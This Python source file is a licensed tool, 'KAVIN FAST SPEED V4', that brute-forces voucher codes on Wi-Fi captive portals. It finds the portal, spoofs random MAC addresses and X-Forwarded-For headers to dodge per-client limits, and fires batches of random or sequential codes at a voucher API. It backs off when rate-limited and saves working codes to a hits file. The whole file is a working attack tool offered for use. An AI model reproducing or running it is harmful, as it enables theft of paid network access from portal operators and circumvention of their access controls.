# =====================================================================
# kavin.py - KAVIN FAST SPEED V4 (Part 1 of 2)
# =====================================================================

import os
import time
import random
import string
import re
import html
import asyncio
import aiohttp
import urllib3
import sys
import threading
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.layout import Layout
from rich.table import Table
from rich.align import Align

import license as _license

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"

# Safe Concurrency Settings
CONCURRENCY_LIMIT = 10  
RATE_LIMIT_SLEEP = 15 
NETWORK_RETRY_SLEEP = 0.5
SESSION_REFRESH_SLEEP = 1.0

console = Console()

# RAM ထဲမှာ ခဏမှတ်မယ့် Set (ပရိုဂရမ်ပိတ်ရင် အလိုအလျောက် ပျောက်သွားမယ်)
tried_codes = set()
code_lock = threading.Lock()

LICENSE_INFO = {"status": ""}

VENDOR_PREFIXES = [
    [0x00, 0x1A, 0x2B], [0x00, 0x50, 0x56], [0x00, 0x0C, 0x29],
    [0x64, 0x66, 0xB3], [0xCC, 0x2D, 0xE0], [0x54, 0x60, 0x09],
    [0x28, 0xFF, 0x82], [0x70, 0x3A, 0x0E], [0xAC, 0xDE, 0x48],
    [0x10, 0x4F, 0xA8], [0x38, 0xBC, 0x1A], [0x74, 0xDA, 0xDA]
]

def generate_random_mac():
    first_octet = random.choice([0x00, 0x02, 0x04, 0x06, 0x0A, 0x0E])
    mac = [first_octet] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(map(lambda x: "%02x" % x, mac)).upper()

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception: return "00:00:00"

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9_-]+)", value, re.IGNORECASE)
        if m: return m.group(1)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    return None

async def fetch_session(session):
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
        "http://detectportal.firefox.com/success.txt"
    ]
    for url in probes:
        try:
            fake_mac = generate_random_mac()
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Client-Mac": fake_mac,
                "X-Forwarded-For": f"192.168.100.{random.randint(2, 254)}"
            }
            async with session.get(url, timeout=2.5, allow_redirects=True, headers=headers, ssl=False) as r:
                text = await r.text()
                p = urlparse(str(r.url))
                if "gstatic.com" in p.netloc or "apple.com" in p.netloc: continue
                portal_base = f"{p.scheme}://{p.netloc}"
                cands = [str(r.url), text]
                for c in cands:
                    sid = extract_session(c)
                    if sid: return portal_base, sid
                if portal_base:
                    return portal_base, f"fake_sess_{random.randint(1000,9999)}"
        except Exception: continue
    return "http://192.168.1.1", f"fake_sess_{random.randint(1000,9999)}"

async def test_code(session, portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    fake_mac = generate_random_mac()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "Content-Type": "application/json", 
        "Origin": portal_base,
        "Client-Mac": fake_mac,
        "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    }
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        async with session.post(url, json=payload, headers=headers, timeout=2.0, ssl=False) as r:
            if r.status == 429: return "__RATE_LIMITED__", "1HR"
            res_text = await r.text()
            if not res_text: res_text = "__NETWORK_ERROR__"
            
            plan = "1HR"
            low = res_text.lower()
            if "2hr" in low: plan = "2HR"
            elif "12hr" in low: plan = "12HR"
            elif "24hr" in low or "1day" in low: plan = "24HR"
            
            return res_text, plan
    except Exception: return "__NETWORK_ERROR__", "1HR"

seq_counter = 0
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter
            if mode == "num": return str(current).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return str(current).zfill(length)
        else:
            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""
# =====================================================================
# kavin.py - KAVIN FAST SPEED V4 (Part 2 of 2)
# =====================================================================

def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed):
    layout = Layout()
    header_text = Text("⚡ KAVIN FAST SPEED V4 ⚡", style="bold bright_cyan", justify="center")
    sub_text = Text(f"Engine: {scan_method.upper()} • @kavin799", style="bold bright_green", justify="center")
    layout.split_column(
        Layout(Panel(Align.center(Text.assemble(header_text, "\n", sub_text)), border_style="cyan", box=ROUNDED), size=4),
        Layout(name="body", ratio=1)
    )

    stats = Table.grid(expand=True, padding=(0, 1))
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold cyan", justify="left")
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold green", justify="left")

    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    stats.add_row("  🎯 Mode", f": {mode.upper()}", "  📊 Tested", f": {tested:,}")
    stats.add_row("  ⚡ Speed", f": {int(speed)} c/m", "  📡 Status", f": {status.upper()}")
    stats.add_row("  🔑 Hits", f": {len(hits)}", "  📌 Engine", f": {scan_method.upper()}")
    
    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
    check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)

    v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    v_table.add_column("Voucher Hits", style="bold green", justify="center")
    v_table.add_column("Plan", style="bold green", justify="center")
    v_table.add_column("Remaining", style="bold green", justify="center")
    
    for h in hits[-10:]:
        code_str = h.get('code', '') if isinstance(h, dict) else h
        plan_str = h.get('plan', '1HR') if isinstance(h, dict) else '1HR'
        v_table.add_row(code_str, plan_str, "Active")
    
    if not hits:
        v_table.add_row("[dim]Stable KAVIN FAST SPEED V4 scanner active...[/dim]", "", "")

    footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)

    body_layout = Layout()
    body_layout.split_column(
        Layout(stats_panel, size=6),
        Layout(check_panel, size=3),
        Layout(v_table, ratio=1),
        Layout(footer_panel, size=3)
    )
    
    layout["body"].update(body_layout)
    return layout

async def scan_loop_async(mode, length, scan_method="random"):
    global seq_counter, tried_codes
    tried_codes.clear()
    
    mode_str = f"{mode}_{length}"
    hits = []
    tested = 0
    start_time = time.time()
    
    current_code = [""]
    current_status = ["Init"]

    conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(connector=conn_limit) as session:
        current_portal, current_session = await fetch_session(session)

        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0), refresh_per_second=4, screen=False)
        
        with live:
            try:
                while True:
                    if not current_session or not current_portal:
                        current_status[0] = "Re-fetching"
                        current_portal, current_session = await fetch_session(session)
                        await asyncio.sleep(SESSION_REFRESH_SLEEP)
                        continue

                    batch_codes = []
                    while len(batch_codes) < CONCURRENCY_LIMIT:
                        c = gen_code(mode, length, scan_method)
                        if c:
                            with code_lock:
                                if c in tried_codes:
                                    continue
                                tried_codes.add(c)
                            batch_codes.append(c)

                    if not batch_codes:
                        await asyncio.sleep(0.1)
                        continue

                    tasks = [test_code(session, current_portal, current_session, code) for code in batch_codes]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    hit_found_in_batch = False
                    for idx, res_tuple in enumerate(results):
                        tested += 1
                        code = batch_codes[idx]
                        current_code[0] = code

                        if isinstance(res_tuple, Exception):
                            continue

                        res, plan = res_tuple

                        if res == "__RATE_LIMITED__":
                            current_status[0] = "Limit (Wait)"
                            live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(time.time() - start_time), current_status[0], hits, (tested / (time.time() - start_time) * 60)))
                            await asyncio.sleep(RATE_LIMIT_SLEEP)
                            current_session = None
                            hit_found_in_batch = True
                            break

                        low = (res or "").lower()
                        if "request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low:
                            current_status[0] = "Limit (Wait)"
                            live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(time.time() - start_time), current_status[0], hits, (tested / (time.time() - start_time) * 60)))
                            await asyncio.sleep(RATE_LIMIT_SLEEP)
                            current_session = None
                            hit_found_in_batch = True
                            break

                        if '"success":true' in low or '"authresult":"1"' in low or "congratulations" in low:
                            now_str = time.strftime("%H:%M:%S")
                            hits.append({"code": code, "time": now_str, "plan": plan})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                            except Exception: pass
                            current_status[0] = "Active"
                            current_session = None
                            hit_found_in_batch = True
                            break
                        
                        current_status[0] = "Active"

                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed))

                    if hit_found_in_batch:
                        await asyncio.sleep(0.2)

            except (KeyboardInterrupt, asyncio.CancelledError):
                pass

def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V4 ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3"): continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        for i in range(4, 9): console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] ⚡ {i} Characters")
        length = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if length == "0": return None
        if length not in ("4", "5", "6", "7", "8"): continue
        return int(length)

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode (ကျပန်းစနစ်)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode (အစဉ်လိုက်စနစ်)\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2"): continue
        return {"1": "random", "2": "sequential"}[choice]

def run():
    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_method = ask_scan_method()
        if scan_method is None: continue
        
        try:
            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method))
        except KeyboardInterrupt:
            pass
        break

def main():
    global LICENSE_INFO
    try:
        is_valid, expiry_msg = _license.check_approval()
        while not is_valid:
            clear_screen()
            console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V4 ⚡", style="bold bright_magenta")), border_style="bright_magenta"))
            console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐", style="bold yellow")), border_style="yellow"))
            
            key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
            if key:
                ok, msg = _license.activate(key)
                console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")), border_style="green" if ok else "red"))
                time.sleep(2)
                is_valid, expiry_msg = _license.check_approval()
            else:
                time.sleep(1)

        LICENSE_INFO["status"] = expiry_msg
        run()
        
    except (KeyboardInterrupt, EOFError):
        console.print("\n\n[bold red]Exiting Kavin Scanner...[/bold red]\n")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except Exception: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except Exception: pass

if __name__ == "__main__":
    main()
